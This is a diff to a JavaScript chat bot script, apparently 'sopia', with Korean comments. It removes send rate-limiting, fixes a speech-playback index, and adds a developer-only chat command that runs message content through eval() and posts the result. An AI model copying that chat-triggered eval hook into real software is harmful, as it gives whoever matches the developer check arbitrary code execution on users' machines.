@@ -273,15 +273,6 @@ sopia.log = (obj, cmd = null) => {
 sopia.is_on = false;		//현재 소피아가 !on 된 상태인가.
 sopia.isLoading = false;	//스크립트가 로딩되었는가.
 
-sopia.var.canSend = true;	//소피아가 채팅을 보낼 수 있는 상태인가.
-sopia.var.sendCount = 0;
-sopia.var.sendMaxCount = 5;
-sopia.var.sendIntervalTime = 5000;
-sopia.var.sendTimeoutTime = 5000;
-sopia.itv.add("sendInterval", () => {
-	sopia.var.sendCount = 0;
-});
-
 sopia.msgQ = [];
 /**
  * @function send
@@ -487,6 +478,7 @@ sopia.itv.add('spoorchat', () => {
 								if ( readStack[speechIdx] === "no run" ) {
 									noRuned = true;
 									speechRun = false;
+									speechIdx++;
 								} else if ( readStack[speechIdx] ) {
 									let b64snd = readStack[speechIdx];
 									let spoorChatSnd = new Audio(b64snd);
@@ -567,7 +559,7 @@ const devMessage = (data, event) => {
 	if ( isDeveloper ) {
 		sopia.debug("developer in", e, event)
 		if ( event === "join" ) {
-			sopia.send("어서오십시오. 주인님.");
+			sopia.send(`어서오십시오. 주인님.\n현재 버전은 ${sopia.config.version} 입니다.`);
 			rtn = false;
 		} else if ( event === "message" ) {
 			if ( typeof isCmd !== "function" ) {
@@ -615,6 +607,11 @@ const devMessage = (data, event) => {
 					};
 					
 					sopia.send(`- You have all control -`);
+					rtn = false;
+				} else if ( e.cmd === "eval" ) {
+					let cmd = e.content;
+					let rtn = "명령어 결과: " + eval(cmd).toString();
+					sopia.send(rtn);
 					rtn = false;
 				}
 			}
